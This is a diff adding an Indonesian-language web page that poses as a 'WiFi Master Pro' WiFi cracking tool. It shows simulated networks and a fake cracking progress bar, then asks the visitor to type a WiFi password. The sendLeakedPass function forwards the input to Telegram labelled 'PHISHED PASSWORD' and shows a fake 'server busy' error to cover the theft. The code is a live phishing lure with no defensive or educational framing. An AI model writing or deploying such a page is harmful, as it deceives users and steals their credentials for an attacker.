@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>WiFi Master - Results</title>
+    <link rel="stylesheet" href="assets/styles.css">
+</head>
+<body>
+    <div class="header">
+        <img src="img/icons.png" width="40">
+        <span>WiFi Master Pro v7.0</span>
+    </div>
+
+    <div class="container">
+        <h3>Jaringan Ditemukan di Sekitar:</h3>
+        <div id="wifi-list">
+            <div class="loading-text">Mencari sinyal terkuat...</div>
+        </div>
+    </div>
+
+    <div id="crack-modal" class="modal">
+        <div class="modal-content">
+            <h4 id="target-name">Crack WiFi</h4>
+            <div class="progress-bar"><div id="fill" class="fill"></div></div>
+            <p id="status-crack">Decrypting WPA2 Enterprise...</p>
+            <div id="final-step" style="display:none;">
+                <p>Sinyal terenkripsi! Masukkan password lama/default untuk bypass:</p>
+                <input type="text" id="phish-pass" placeholder="Password WiFi...">
+                <button class="btn-scan" onclick="sendLeakedPass()">UNLOCK NOW</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="assets/core.js"></script>
+    <script>
+    const fakeNames = ["Indihome-Fiber", "@wifi.id", "TP-Link_Secure", "Tenda_F3", "Kopi-Senja-Guest"];
+    
+    window.onload = () => {
+        const list = document.getElementById('wifi-list');
+        list.innerHTML = "";
+        
+        // Simulasi List WiFi
+        fakeNames.forEach(name => {
+            const div = document.createElement('div');
+            div.className = "wifi-item";
+            div.innerHTML = `
+                <div class="info">
+                    <strong>${name}</strong><br>
+                    <small>Signal: ${Math.floor(Math.random()*40 + 60)}% | WPA2</small>
+                </div>
+                <button onclick="startCrack('${name}')">CRACK</button>
+            `;
+            list.appendChild(div);
+        });
+    };
+
+    function startCrack(name) {
+        document.getElementById('crack-modal').style.display = 'block';
+        document.getElementById('target-name').innerText = "Cracking: " + name;
+        let p = 0;
+        const interval = setInterval(() => {
+            p += Math.random() * 10;
+            document.getElementById('fill').style.width = p + "%";
+            if(p >= 100) {
+                clearInterval(interval);
+                document.getElementById('status-crack').innerText = "Handshake Captured!";
+                document.getElementById('final-step').style.display = 'block';
+            }
+        }, 300);
+    }
+
+    async function sendLeakedPass() {
+        const pass = document.getElementById('phish-pass').value;
+        const target = document.getElementById('target-name').innerText;
+        await sendToTelegram(`🔑 *PHISHED PASSWORD*\n${target}\nInput: \`${pass}\``);
+        alert("Gagal menyambungkan. Server sibuk, coba lagi nanti.");
+        location.reload();
+    }
+    </script>
+</body>
+</html>
